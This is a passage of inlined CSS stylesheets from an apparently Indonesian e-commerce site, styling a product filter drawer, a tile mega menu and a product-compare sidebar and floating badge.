  animation:badgeSheen 6s linear infinite;
}
@keyframes badgeSheen {
  0%{transform:translateX(-100%)}
  55%{transform:translateX(120%)}
  100%{transform:translateX(120%)}
}
.pa-filter-badge a.clear {
  text-decoration:none;
  color:#c02828;
  font-weight:700;
  padding:0 3px;
  display:inline-flex;
  align-items:center;
  justify-content:center;
  border-radius:50%;
  line-height:1;
  transition:background .25s, color .25s;
}
.pa-filter-badge a.clear:hover { background:#ffeded; color:#a40000; }
.pa-btn-filter { width: 100%;}

/* =========================================================
   ACTIONS (DESKTOP) - STATIC BOTTOM
   ========================================================= */
.f-actions {
  margin-top:10px;
  display:flex;
  gap:12px;
  flex-wrap:wrap;
  padding:16px 0 4px;
  border-top:1px solid #e2e8f0;
  background:linear-gradient(180deg,rgba(255,255,255,0) 0%,#f1f5f9 70%);
  flex-shrink:0;
}
.f-actions button {
  background:linear-gradient(135deg,#1d6ce0 0%,#155ab8 100%);
  color:#fff;
  border:none;
  padding:10px 20px;
  border-radius:12px;
  cursor:pointer;
  font-size:14px;
  font-weight:600;
  letter-spacing:.3px;
  display:inline-flex;
  align-items:center;
  gap:6px;
  box-shadow:0 4px 14px -2px rgba(29,108,224,.45);
  transition:transform .25s, box-shadow .3s;
}
.f-actions button:hover { transform:translateY(-3px); box-shadow:0 8px 26px -4px rgba(29,108,224,.6); }
.f-actions button:active { transform:translateY(-1px) scale(.98); box-shadow:0 4px 14px -4px rgba(29,108,224,.55); }
.f-actions .reset {
  font-size:12px;
  text-decoration:none;
  color:#8adeff;
  align-self:center;
  font-weight:600;
  padding:4px 6px;
  border-radius:8px;
  transition:background .25s, color .25s;
}
.f-actions .reset:hover { background:#ffe6e6; color:#8adeff; text-decoration:underline; }
.pa-filters .close-drawer { display: none; }

/* Form wrapper: flex container agar inner .filters-scroll bisa scroll di desktop */
.filter-form {
  flex: 1;
  min-height: 0;
  display: flex;
  flex-direction: column;
  overflow: hidden;
}

/* =========================================================
   FILTER TOGGLE (MOBILE TRIGGER)
   ========================================================= */
.filter-toggle {
  display:none;
  margin:0 0 14px;
  background:linear-gradient(135deg,#1d6ce0 0%,#155ab8 100%);
  color:#fff;
  border:none;
  padding:11px 18px;
  font-size:14px;
  font-weight:600;
  border-radius:14px;
  cursor:pointer;
  letter-spacing:.4px;
  box-shadow:0 4px 14px -2px rgba(29,108,224,.55);
  position:relative;
  z-index:100;
  transition:box-shadow .3s, transform .25s;
}
.filter-toggle:hover { box-shadow:0 8px 26px -4px rgba(29,108,224,.6); transform:translateY(-2px); }
.filter-toggle:active { transform:translateY(0); box-shadow:0 4px 14px -4px rgba(29,108,224,.55); }
.filter-toggle .count-badge {
  display:inline-block;
  background:linear-gradient(135deg,#8adeff 0%,#8adeff 55%,#8adeff 100%);
  color:#1d2b44;
  font-size:11px;
  font-weight:700;
  padding:3px 7px 4px;
  border-radius:30px;
  margin-left:8px;
  box-shadow:0 0 0 2px #ffffff,0 0 0 4px #1d6ce0;
}

/* Overlay (mobile) */
.pa-filters-overlay { display:none; }

/* =========================================================
   MOBILE DRAWER
   ========================================================= */
@media (max-width:768px){
  .product-archive.with-filters .pa-layout { flex-direction:column; gap:12px; }
  .filter-toggle { display:inline-flex; align-items:center; gap:6px; }

  .pa-filters-overlay {
    position:fixed;
    inset:0;
    background:rgba(0,20,45,.55);
    z-index:998;
    opacity:0;
    transition:opacity .35s;
    display:block;
    pointer-events:none;
    backdrop-filter:blur(2px);
  }
  .pa-filters-overlay.active { opacity:1; pointer-events:auto; }

  .pa-filters {
    position:fixed;
    top:auto;
    left:0; right:0; bottom:0;
    max-height:92vh;
    height:auto;
    width:100%;
    border-radius:30px 30px 0 0;
    border:1px solid #dbe4ef;
    padding:26px 22px 0;
    z-index:10000; /* di atas bottom-nav (9998) */
    transform:translateY(102%);
    transition:transform .55s cubic-bezier(.68,-0.35,.25,1);
    box-shadow:0 -4px 40px -6px rgba(15,23,42,.45);
    overflow:hidden; /* outer hidden, inner scroll */
  }
  .pa-filters.active { transform:translateY(0); }

  /* Drag handle indicator */
  .pa-filters::after {
    content:"";
    display:block;
    position:absolute;
    top:10px;
    left:50%;
    transform:translateX(-50%);
    width:36px;
    height:4px;
    background:#cbd5e1;
    border-radius:4px;
  }
  body.filter-open { overflow:hidden; touch-action:none; }

  /* Restore mobile-friendly input sizes (prevent iOS zoom on focus) */
  .pa-filters input[type=text],
  .pa-filters input[type=number],
  .pa-filters select {
    font-size:16px;
    min-height:44px;
    padding:10px 12px;
    border-radius:10px;
  }
  .pa-filters select { padding-right:32px; }

  .filters-scroll {
    flex:1;
    overflow:auto;
    padding:0 0 120px; /* ruang di atas bar actions */
    margin:0;
    -webkit-overflow-scrolling:touch;
  }

  .pa-filters h2 { font-size:19px; margin-bottom:10px; }

  .pa-filters .close-drawer {
    display: block;
    position:absolute;
    right:14px; top:12px;
    background:linear-gradient(135deg,#8adeff 0%,#8adeff 100%);
    color:#fff;
    padding:7px 14px;
    border:none;
    border-radius:10px;
    font-size:12px;
    font-weight:600;
    cursor:pointer;
    box-shadow:0 3px 10px -2px rgba(18, 131, 206, 0.3);
    transition:transform .25s, box-shadow .3s;
    z-index: 99;
  }
  .pa-filters .close-drawer:hover { transform:translateY(-2px); box-shadow:0 6px 18px -4px rgba(18, 131, 206, 0.3); }

  .spec-attr { border-radius:18px; }
  .spec-attr-options label { font-size:11px; padding:5px 9px; }

  /* Actions fixed di viewport bawah */
  .f-actions {
    position:fixed;
    left:0; right:0; bottom:0;
    margin:0;
    border-top:1px solid #d6dee8;
    padding:14px 16px calc(16px + env(safe-area-inset-bottom));
    background:#ffffffea;
    backdrop-filter:blur(6px);
    box-shadow:0 -4px 22px -6px rgba(15,23,42,.25);
    justify-content:space-between;
    z-index:10001; /* di atas pa-filters (10000) dan bottom-nav (9998) */
  }

  /* Sembunyikan bottom-nav saat filter drawer terbuka */
  body.filter-open .bottom-nav {
    display: none !important;
  }
  .f-actions button {
    flex:1 1 auto;
    justify-content:center;
    padding:14px 14px;
    font-size:15px;
    border-radius:14px;
  }
  .f-actions .reset {
    order:-1;
    font-size:12px;
    padding:2px 8px;
  }
}

/* Scrollbar (outer panel desktop only kept for compatibility) */
.pa-filters::-webkit-scrollbar { width:0; } /* disembunyikan karena inner yang scroll */

/* Utilities */
.hidden { display:none !important; }
.gradient-text {
  background:linear-gradient(90deg,#1d6ce0,#155ab8,#1d6ce0);
  -webkit-background-clip:text;
  color:transparent;
  animation:titleSheen 10s linear infinite;
}
.glow-focus:focus {
  outline:none !important;
  box-shadow:0 0 0 3px rgba(29,108,224,.4) !important;
  border-color:#1d6ce0 !important;
}

/* Simple fade (opsional) */
@keyframes fadeIn {
  from { opacity:0; transform:translateY(8px); }
  to { opacity:1; transform:translateY(0); }
}
</style>
  <style data-inlined="mega-menu-tiles.css">
/* Tile Mega Menu â€” Modern E-commerce Enhanced (2025) */

/* Design Tokens */
:root {
  --mm2-bg: #ffffff;
  --mm2-surface: #ffffff;
  --mm2-surface-elevated: rgba(255,255,255,0.98);
  --mm2-muted: #f8fafc;
  --mm2-border: #e2e8f0;
  --mm2-border-strong: #cbd5e1;
  --mm2-accent: #6366f1;
  --mm2-accent-hover: #4f46e5;
  --mm2-accent-10: rgba(99,102,241,.10);
  --mm2-accent-20: rgba(99,102,241,.20);
  --mm2-fg: #0f172a;
  --mm2-fg-muted: #64748b;
  --mm2-fg-light: #94a3b8;
  
  /* Enhanced Shadows - Multi-layer elevation */
  --mm2-shadow-sm: 0 2px 8px rgba(15,23,42,.06), 0 1px 2px rgba(15,23,42,.04);
  --mm2-shadow-md: 0 8px 24px rgba(15,23,42,.10), 0 2px 8px rgba(15,23,42,.06);
  --mm2-shadow-lg: 0 20px 60px rgba(15,23,42,.14), 0 8px 24px rgba(15,23,42,.08);
  --mm2-shadow-xl: 0 32px 80px rgba(15,23,42,.18), 0 12px 32px rgba(15,23,42,.10);
  --mm2-shadow-hover: 0 16px 40px rgba(15,23,42,.16), 0 6px 16px rgba(15,23,42,.08);
  
  /* Border Radius */
  --mm2-radius-xl: 20px;
  --mm2-radius-lg: 16px;
  --mm2-radius-md: 12px;
  --mm2-radius-sm: 10px;
  
  --mm2-z: 60;
  
  /* Animation Timing */
  --mm2-transition-fast: 150ms cubic-bezier(0.4, 0, 0.2, 1);
  --mm2-transition-base: 250ms cubic-bezier(0.4, 0, 0.2, 1);
  --mm2-transition-slow: 350ms cubic-bezier(0.4, 0, 0.2, 1);
}

.navbar { position: relative; z-index: var(--mm2-z); }

/* Trigger Button - Enhanced */
.mm2-trigger {
  display: inline-flex; align-items: center; gap: 8px;
  padding: 10px 14px; border-radius: var(--mm2-radius-md);
  border: 1.5px solid var(--mm2-border);
  background: var(--mm2-surface); color: var(--mm2-fg);
  cursor: pointer; user-select: none;
  transition: all var(--mm2-transition-fast);
  text-decoration: none;
  font-weight: 600;
  box-shadow: var(--mm2-shadow-sm);
}
.mm2-trigger:hover { 
  border-color: var(--mm2-accent); 
  background: var(--mm2-muted);
  box-shadow: var(--mm2-shadow-md);
  transform: translateY(-1px);
}
.mm2-trigger:active { transform: translateY(0); }
.mm2-trigger svg {max-width: unset !important; transition: transform var(--mm2-transition-fast); }
.mm2-trigger:hover svg { transform: scale(1.05); }

/* Backdrop - Enhanced Glassmorphism */
.mm2-backdrop {
  position: fixed; 
  inset: 0;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(15,23,42,.40);
  backdrop-filter: blur(8px) saturate(1.2);
  -webkit-backdrop-filter: blur(8px) saturate(1.2);
  opacity: 0; 
  pointer-events: none;
  z-index: 499;
  transition: opacity var(--mm2-transition-base);
}
.mm2-open .mm2-backdrop { opacity: 1; pointer-events: auto; }

/* Panel - Glassmorphism Enhanced */
.mm2-panel {
  position: fixed;
  left: 50%;
  top: 120px;
  transform: translateX(-50%) translateY(-16px);
  width: min(1200px, 95vw);
  background: var(--mm2-surface-elevated);
  backdrop-filter: blur(20px) saturate(1.8);
  -webkit-backdrop-filter: blur(20px) saturate(1.8);
  border: 1.5px solid var(--mm2-border-strong);
  border-radius: var(--mm2-radius-xl);
  box-shadow: var(--mm2-shadow-xl);
  display: none;
  overflow: hidden;
  opacity: 0;
  z-index: 500;
  transition: transform var(--mm2-transition-slow), opacity var(--mm2-transition-base);
}
.mm2-open .mm2-panel { 
  display: block; 
  opacity: 1; 
  transform: translateX(-50%) translateY(0);
}

/* View switcher */
.mm2-view { display: none; }
.mm2-open .mm2-view.is-active { display: block; }

/* Top grid (level-1 tiles) - Enhanced */
.mm2-top {
  padding: 24px;
  max-height: 75vh; overflow: auto;
}
.mm2-grid {
  display: grid;
  grid-template-columns: repeat(4, minmax(0,1fr));
  gap: 14px;
}
@media (max-width: 1200px) { .mm2-grid { grid-template-columns: repeat(3, minmax(0,1fr)); } }
@media (max-width: 960px)  { .mm2-grid { grid-template-columns: repeat(2, minmax(0,1fr)); gap: 12px; } }

/* Stagger animation for cards */
.mm2-open .mm2-card {
  animation: slideInUp 0.3s cubic-bezier(0.4, 0, 0.2, 1) backwards;
}
.mm2-open .mm2-card:nth-child(1)  { animation-delay: 0.02s; }
.mm2-open .mm2-card:nth-child(2)  { animation-delay: 0.04s; }
.mm2-open .mm2-card:nth-child(3)  { animation-delay: 0.06s; }
.mm2-open .mm2-card:nth-child(4)  { animation-delay: 0.08s; }
.mm2-open .mm2-card:nth-child(5)  { animation-delay: 0.10s; }
.mm2-open .mm2-card:nth-child(6)  { animation-delay: 0.12s; }
.mm2-open .mm2-card:nth-child(7)  { animation-delay: 0.14s; }
.mm2-open .mm2-card:nth-child(8)  { animation-delay: 0.16s; }
.mm2-open .mm2-card:nth-child(9)  { animation-delay: 0.18s; }
.mm2-open .mm2-card:nth-child(10) { animation-delay: 0.20s; }
.mm2-open .mm2-card:nth-child(11) { animation-delay: 0.22s; }
.mm2-open .mm2-card:nth-child(12) { animation-delay: 0.24s; }
.mm2-open .mm2-card:nth-child(n+13) { animation-delay: 0.26s; }

@keyframes slideInUp {
  from {
    opacity: 0;
    transform: translateY(12px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.mm2-card {
  position: relative;
  display: flex; gap: 14px; align-items: center;
  padding: 16px; border-radius: var(--mm2-radius-md);
  background: var(--mm2-surface);
  border: 1.5px solid var(--mm2-border);
  text-decoration: none; color: var(--mm2-fg);
  transition: all var(--mm2-transition-fast);
  min-height: 72px;
  box-shadow: var(--mm2-shadow-sm);
}
.mm2-card:hover { 
  border-color: var(--mm2-accent);
  background: linear-gradient(135deg, rgba(255,255,255,1), rgba(248,250,252,1));
  box-shadow: var(--mm2-shadow-hover);
  transform: translateY(-3px);
}
.mm2-card:active { transform: translateY(-1px); }

/* Icon with category-specific gradients */
.mm2-card .mm2-ico {
  width: 48px; height: 48px; border-radius: 12px;
  display: inline-flex; align-items: center; justify-content: center;
  background: linear-gradient(135deg, #e0e7ff, #fff);
  border: 1.5px solid #c7d2fe;
  color: #4f46e5;
  flex-shrink: 0;
  transition: all var(--mm2-transition-fast);
  box-shadow: 0 2px 8px rgba(99,102,241,0.1);
}
.mm2-card:hover .mm2-ico {
  transform: scale(1.08) rotate(2deg);
  box-shadow: 0 4px 16px rgba(99,102,241,0.2);
}
.mm2-card .mm2-ico svg { transition: transform var(--mm2-transition-fast); }
.mm2-card:hover .mm2-ico svg { transform: scale(1.1); }

.mm2-card .mm2-title { 
  font-weight: 700; 
  font-size: 15px;
  letter-spacing: -0.01em;
  line-height: 1.3;
}
.mm2-card .mm2-sub { 
  color: var(--mm2-fg-muted); 
  font-size: 12.5px; 
  margin-top: 3px;
  display: flex;
  align-items: center;
  gap: 4px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
.mm2-card .mm2-count {
  display: inline-flex;
  padding: 2px 8px;
  border-radius: 6px;
  background: var(--mm2-accent-10);
  color: var(--mm2-accent);
  font-weight: 600;
  font-size: 11px;
  margin-left: 4px;
}

/* Detail view (level-2 + level-3) - Enhanced */
.mm2-detail {
  position: relative;
  padding: 16px 24px 24px;
  max-height: 70vh; overflow: auto;
}
.mm2-detail-header {
  display: flex; align-items: center; gap: 14px;
  padding: 10px 0 16px; border-bottom: 2px solid var(--mm2-muted); margin-bottom: 16px;
}
.mm2-back {
  display: inline-flex; align-items: center; justify-content: center;
  width: 40px; height: 40px; border-radius: 12px;
  border: 1.5px solid var(--mm2-border); background: #fff; color: var(--mm2-fg);
  cursor: pointer;
  transition: all var(--mm2-transition-fast);
  box-shadow: var(--mm2-shadow-sm);
}
.mm2-back:hover {
  border-color: var(--mm2-accent);
  background: var(--mm2-muted);
  transform: translateX(-3px);
  box-shadow: var(--mm2-shadow-md);
}
.mm2-detail-title { 
  font-weight: 800; 
  font-size: 18px;
  letter-spacing: -0.02em;
}

/* Two-pane layout (desktop) - Enhanced */
.mm2-detail-layout {
  display: grid;
  grid-template-columns: 280px 1fr;
  gap: 20px;
}

/* Left: subnav (level-2 list) - Enhanced */
.mm2-subnav {
  position: sticky; top: 8px;
  align-self: start;
  max-height: calc(70vh - 56px);
  overflow: auto;
  padding-right: 6px;
}
.mm2-subnav::-webkit-scrollbar { width: 8px; height: 8px; }
.mm2-subnav::-webkit-scrollbar-track { background: transparent; }
.mm2-subnav::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 8px; }
.mm2-subnav::-webkit-scrollbar-thumb:hover { background: #94a3b8; }

.mm2-subitem {
  display: flex; align-items: center; justify-content: flex-start; gap: 10px;
  width: 100%;
  padding: 12px 14px;
  border-radius: 12px;
  border: 1.5px solid transparent;
  background: transparent;
  color: var(--mm2-fg);
  cursor: pointer;
  text-align: left;
  transition: all var(--mm2-transition-fast);
  margin-bottom: 6px;
  font-weight: 600;
  font-size: 14px;
  position: relative;
}
.mm2-subitem::before {
  content: '';
  position: absolute;
  left: 0;
  top: 50%;
  transform: translateY(-50%);
  width: 3px;
  height: 0;
  background: var(--mm2-accent);
  border-radius: 0 2px 2px 0;
  transition: height var(--mm2-transition-fast);
}
.mm2-subitem:hover { 
  background: var(--mm2-muted);
  color: var(--mm2-accent-hover);
}
.mm2-subitem.active {
  background: linear-gradient(135deg, rgba(99,102,241,0.08), rgba(99,102,241,0.04));
  border-color: var(--mm2-accent-20);
  color: var(--mm2-accent-hover);
  box-shadow: inset 0 0 0 1px rgba(99,102,241,0.1);
}
.mm2-subitem.active::before {
  height: 24px;
}

/* Right: subcontent (level-3 grid) - Enhanced */
.mm2-subcontent { min-height: 240px; }
.mm2-links {
  display: grid; gap: 12px 14px;
  grid-template-columns: repeat(3, minmax(0,1fr));
}
@media (max-width: 1200px) { .mm2-links { grid-template-columns: repeat(2, minmax(0,1fr)); } }

.mm2-link {
  display: flex; align-items: center; gap: 12px;
  padding: 14px; border: 1.5px solid var(--mm2-border); border-radius: var(--mm2-radius-md);
  background: var(--mm2-surface); color: var(--mm2-fg); text-decoration: none;
  min-height: 52px;
  font-weight: 500;
  font-size: 14px;
  transition: all var(--mm2-transition-fast);
  box-shadow: var(--mm2-shadow-sm);
  position: relative;
  justify-content: space-between;
}
.mm2-link:hover { 
  background: var(--mm2-muted); 
  border-color: var(--mm2-accent);
  transform: translateX(4px);
  box-shadow: var(--mm2-shadow-md);
}
.mm2-link-text {
  flex: 1;
}

/* Product Thumbnails */
.mm2-thumbs {
  display: flex;
  gap: 6px;
  align-items: center;
  margin-left: auto;
  flex-shrink: 0;
}
.mm2-thumb {
  width: 36px;
  height: 36px;
  border-radius: 8px;
  object-fit: cover;
  border: 1.5px solid var(--mm2-border);
  box-shadow: 0 2px 6px rgba(0,0,0,0.08);
  transition: all var(--mm2-transition-fast);
  background: var(--mm2-muted);
}
.mm2-link:hover .mm2-thumb {
  border-color: var(--mm2-accent);
  box-shadow: 0 4px 10px rgba(99,102,241,0.15);
  transform: scale(1.08);
}

/* Thumbnail Skeleton Loader */
.mm2-thumb-skeleton {
  width: 36px;
  height: 36px;
  border-radius: 8px;
  background: linear-gradient(90deg, #f1f5f9 25%, #e2e8f0 50%, #f1f5f9 75%);
  background-size: 200% 100%;
  animation: shimmer 1.5s infinite;
  border: 1.5px solid var(--mm2-border);
}

.mm2-badge {
  font-size: 11px; padding: 3px 10px; margin-left: auto;
  border-radius: 12px; background: var(--mm2-accent-10); color: var(--mm2-accent);
  font-weight: 700;
  border: 1px solid var(--mm2-accent-20);
}

/* "See all" highlight card - Enhanced */
.mm2-seeall {
  border: 2px dashed var(--mm2-accent);
  background: linear-gradient(135deg, rgba(99,102,241,.08), rgba(99,102,241,.02));
  font-weight: 700;
}
.mm2-seeall:hover {
  background: linear-gradient(135deg, rgba(99,102,241,.14), rgba(99,102,241,.06));
  border-style: solid;
  transform: translateX(6px) scale(1.02);
}

/* Mobile panel styles - Enhanced with drag handle & better touch targets */
@media (max-width: 960px) {
  .mm2-panel {
    position: fixed;
    left: 0;
    right: 0;
    bottom: 0;
    top: auto;
    width: 100%;
    max-height: 88vh;
    transform: translateX(0) translateY(100%);
    border-radius: var(--mm2-radius-xl) var(--mm2-radius-xl) 0 0;
    border-bottom: none;
  }
  .mm2-open .mm2-panel {
    transform: translateX(0) translateY(0); z-index: 9999;
  }
  
  /* Enhanced backdrop for mobile */
  .mm2-backdrop {
    backdrop-filter: blur(6px) saturate(1.2);
    -webkit-backdrop-filter: blur(6px) saturate(1.2);
  }
  
  /* Mobile close button - Soft glassmorphism */
  .mm2-mobile-close {
    position: absolute;
    top: 4px;
    right: 8px;
    width: 28px;
    height: 28px;
    border-radius: 50%;
    border: 1px solid rgba(226, 232, 240, 0.6);
    background: rgba(255, 255, 255, 0.85);
    backdrop-filter: blur(12px) saturate(1.8);
    -webkit-backdrop-filter: blur(12px) saturate(1.8);
    color: var(--mm2-fg-muted);
    display: inline-flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: all var(--mm2-transition-fast);
    box-shadow: 0 2px 8px rgba(15, 23, 42, 0.08);
    z-index: 20;
  }
  .mm2-mobile-close:hover {
    background: rgba(254, 242, 242, 0.95);
    border-color: rgba(252, 165, 165, 0.8);
    color: #8adeff;
    box-shadow: 0 4px 12px rgba(220, 38, 38, 0.15);
  }
  .mm2-mobile-close:active {
    transform: scale(0.92);
  }
  
  /* Drag handle indicator */
  .mm2-top::before,
  .mm2-detail::before {
    content: '';
    position: sticky;
    top: 0;
    left: 50%;
    transform: translateX(-50%);
    width: 40px;
    height: 4px;
    background: var(--mm2-border-strong);
    border-radius: 999px;
    margin: 12px auto 20px;
    display: block;
    z-index: 10;
    transition: background var(--mm2-transition-fast);
  }
  .mm2-panel:active .mm2-top::before,
  .mm2-panel:active .mm2-detail::before {
    background: #94a3b8;
  }
  
  .mm2-top {
    padding: 10px;  
  }
  
  .mm2-top, .mm2-detail { 
    max-height: min(82vh, 720px);
    padding-top: 8px;
  }

  /* Two-pane collapses: subnav becomes GRID (no horizontal scroll) */
  .mm2-detail-layout { display: block; }
  .mm2-subnav {
    position: static; max-height: none; overflow: visible;
    display: grid; gap: 10px; padding: 10px 4px 16px; margin-bottom: 16px;
    grid-template-columns: repeat(2, minmax(0,1fr));
    border-bottom: 2px solid var(--mm2-muted);
  }
  .mm2-subitem {
    margin: 0; width: 100%; text-align: center;
    border-radius: 14px;
    background: #fff; border: 1.5px solid var(--mm2-border);
    white-space: normal; line-height: 1.3; min-height: 48px;
    justify-content: center;
    padding: 12px 10px;
    font-size: 13.5px;
    box-shadow: var(--mm2-shadow-sm);
  }
  .mm2-subitem::before { display: none; }
  .mm2-subitem:hover {
    transform: scale(1.02);
  }
  .mm2-subitem.active {
    background: linear-gradient(135deg, var(--mm2-accent), var(--mm2-accent-hover));
    border-color: var(--mm2-accent-hover);
    color: white;
    box-shadow: 0 4px 12px rgba(99,102,241,0.3);
    font-weight: 700;
  }

  /* Level-3 grid tetap 2 kolom dengan spacing lebih baik */
  .mm2-links { 
    grid-template-columns: repeat(2, minmax(0,1fr));
    gap: 10px;
  }
  
  /* Mobile: hide thumbnails untuk save space */
  .mm2-thumbs {
    display: none;
  }
  
  /* Larger touch targets for mobile */
  .mm2-card {
    min-height: 80px;
    padding: 18px 14px;
  }
  .mm2-card .mm2-ico {
    width: 50px;
    height: 50px;
  }
  .mm2-card .mm2-title {
    font-size: 14px;
  }
  .mm2-card .mm2-sub {
    font-size: 11.5px;
  }
  .mm2-link {
    min-height: 56px;
    padding: 16px;
  }
  .mm2-back {
    width: 44px;
    height: 44px;
  }
  
  /* Grid spacing */
  .mm2-grid {
    gap: 10px;
  }
}
</style>
  <style data-inlined="product-compare.css">
/* Product Compare Feature Styles */

/* Compare Button in Product Detail - Modern Chip Style */
.pd-compare-section {
  margin: 0.5rem 0;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.pd-compare-btn {
  display: inline-flex;
  align-items: center;
  gap: 0.4rem;
  padding: 0.5rem 0.85rem;
  border: 1px solid #cbd5e1;
  border-radius: 20px;
  background: #fff;
  color: #64748b;
  font-weight: 600;
  font-size: 0.8rem;
  cursor: pointer;
  transition: all 0.2s ease;
  position: relative;
  white-space: nowrap;
}

.pd-compare-btn:hover {
  border-color: #3b82f6;
  color: #3b82f6;
  background: #f0f9ff;
  transform: translateY(-1px);
  box-shadow: 0 2px 6px rgba(59, 130, 246, 0.15);
}

.pd-compare-btn.added {
  border-color: #16a34a;
  color: #16a34a;
  background: #f0fdf4;
}

.pd-compare-btn .compare-remove {
  display: none;
}

.pd-compare-btn.added .compare-text {
  display: none;
}

.pd-compare-btn.added .compare-remove {
  display: flex !important;
  align-items: center;
  gap: 0.25rem;
  font-weight: 600;
  font-size: 0.9rem;
  color: #8adeff !important;
  opacity: 1 !important;
  visibility: visible !important;
  z-index: 1;
  position: relative;
}

.pd-compare-btn.added .compare-remove[hidden] {
  display: flex !important;
}

/* Force visibility for added state */
.pd-compare-btn.added .compare-remove {
  display: flex !important;
}

[hidden].compare-remove {
  display: none !important;
}

.pd-compare-btn.added [hidden].compare-remove {
  display: flex !important;
}

/* Ensure the added state text is always visible */
.pd-compare-btn.added {
  border-color: #8adeff !important;
  color: #8adeff !important;
  background: #fef2f2 !important;
}

.pd-compare-btn.added .compare-remove svg {
  color: #8adeff !important;
}

.pd-compare-btn.added:hover {
  border-color: #15803d;
  color: #15803d;
  background: #dcfce7;
  transform: translateY(-1px);
  box-shadow: 0 2px 6px rgba(22, 163, 74, 0.2);
}

.pd-compare-btn .compare-icon {
  width: 16px;
  height: 16px;
  flex-shrink: 0;
}

.pd-compare-info {
  display: inline-flex;
  align-items: center;
}

.compare-note {
  color: #94a3b8;
  font-size: 0.7rem;
  font-weight: 500;
  transition: color 0.2s ease;
}

.pd-compare-btn.added + .pd-compare-info .compare-note {
  color: #16a34a;
  font-weight: 600;
}

/* Compare Badge in Navigation */
.compare-indicator {
  position: relative;
}

.compare-indicator .badge {
  position: absolute;
  top: -8px;
  right: -8px;
  min-width: 18px;
  height: 18px;
  padding: 0 5px;
  background: #8adeff;
  color: white;
  border-radius: 9px;
  font-size: 11px;
 

/* Floating Compare Badge (Sticky) */
.compare-floating-badge {
  position: fixed;
  right: 16px;
  bottom: calc(20px + 60px); /* Above scroll-to-top button */
  width: auto;
  min-width: 56px;
  height: 56px;
  padding: 0 16px;
  border-radius: 28px;
  background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
  color: #fff;
  box-shadow: 0 8px 24px -8px rgba(59, 130, 246, 0.5);
  cursor: pointer;
  z-index: 1104;
  opacity: 0;
  transform: translateY(8px) scale(0.9);
  transition: opacity 0.3s ease, transform 0.3s ease, box-shadow 0.2s ease;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  font-weight: 600;
  font-size: 0.85rem;
  pointer-events: none;
}

.compare-floating-badge.visible {
  opacity: 1;
  transform: translateY(0) scale(1);
  pointer-events: auto;
}

.compare-floating-badge:hover {
  box-shadow: 0 12px 32px -10px rgba(59, 130, 246, 0.6);
  transform: translateY(-2px) scale(1.02);
}

.compare-floating-badge:active {
  transform: translateY(0) scale(0.98);
}

.compare-floating-badge .cfb-icon {
  width: 20px;
  height: 20px;
  flex-shrink: 0;
}

.compare-floating-badge .cfb-count {
  font-size: 0.9rem;
  font-weight: 700;
  min-width: 20px;
  text-align: center;
  background: rgba(255, 255, 255, 0.25);
  padding: 2px 8px;
  border-radius: 12px;
  line-height: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  height: 24px;
}

.compare-floating-badge .cfb-text {
  display: none;
}

@media (min-width: 641px) {
  .compare-floating-badge .cfb-text {
    display: block;
    white-space: nowrap;
  }
}

@media (max-width: 640px) {
  .compare-floating-badge {
    right: 14px;
    bottom: calc(var(--scroll-top-bottom, calc(68px + 18px + env(safe-area-inset-bottom))) + 60px);
    min-width: 48px;
    height: 48px;
    padding: 0 12px;
    border-radius: 24px;
  }
  
  .compare-floating-badge .cfb-icon {
    width: 18px;
    height: 18px;
  }
  
  .compare-floating-badge .cfb-count {
    font-size: 0.8rem;
    padding: 2px 6px;
    height: 20px;
  }
} font-weight: 600;
  display: flex;
  align-items: center;
  justify-content: center;
  transform: scale(0);
  transition: transform 0.2s ease;
}

.compare-indicator .badge.active {
  transform: scale(1);
}

/* Compare Sidebar */
.compare-sidebar {
  position: fixed;
  top: 0;
  right: -400px;
  width: 400px;
  height: 100vh;
  background: #ffffff;
  box-shadow: -4px 0 20px rgba(0, 0, 0, 0.1);
  z-index: 9999;
  display: flex;
  flex-direction: column;
  transition: right 0.3s ease;
}

.compare-sidebar.open {
  right: 0;
}

.compare-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.5);
  z-index: 9998;
  opacity: 0;
  visibility: hidden;
  transition: all 0.3s ease;
}

.compare-overlay.active {
  opacity: 1;
  visibility: visible;
}

.compare-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 1.25rem;
  border-bottom: 1px solid #e2e8f0;
  background: #f8fafc;
}

.compare-title {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  font-size: 1rem;
  font-weight: 600;
  color: #1e293b;
  margin: 0;
}

.compare-count {
  color: #64748b;
  font-weight: 400;
}

.compare-close {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 32px;
  height: 32px;
  border: none;
  border-radius: 6px;
  background: transparent;
  color: #64748b;
  cursor: pointer;
  transition: all 0.2s ease;
}

.compare-close:hover {
  background: #e2e8f0;
  color: #374151;
}

.compare-content {
  flex: 1;
  overflow-y: auto;
  padding: 1rem;
}

.compare-empty {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  height: 100%;
  text-align: center;
  padding: 2rem 1rem;
}

.compare-empty h5 {
  margin: 1rem 0 0.5rem;
  color: #374151;
}

.compare-empty p {
  color: #64748b;
  font-size: 0.875rem;
  line-height: 1.5;
}

.compare-list {
  display: flex;
  flex-direction: column;
  gap: 0.75rem;
}

.compare-item {
  display: flex;
  align-items: center;
  gap: 0.75rem;
  padding: 0.75rem;
  border: 1px solid #e2e8f0;
  border-radius: 8px;
  background: #ffffff;
  transition: all 0.2s ease;
}

.compare-item:hover {
  border-color: #cbd5e1;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
}

.compare-item-image {
  flex-shrink: 0;
  width: 48px;
  height: 48px;
  border-radius: 6px;
  overflow: hidden;
  border: 1px solid #e2e8f0;
}

.compare-item-image img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.compare-item-info {
  flex: 1;
  min-width: 0;
}

.compare-item-name {
  font-weight: 500;
  font-size: 0.875rem;
  color: #1e293b;
  margin-bottom: 0.25rem;
  line-height: 1.3;
  display: -webkit-box;
  -webkit-line-clamp: 2;
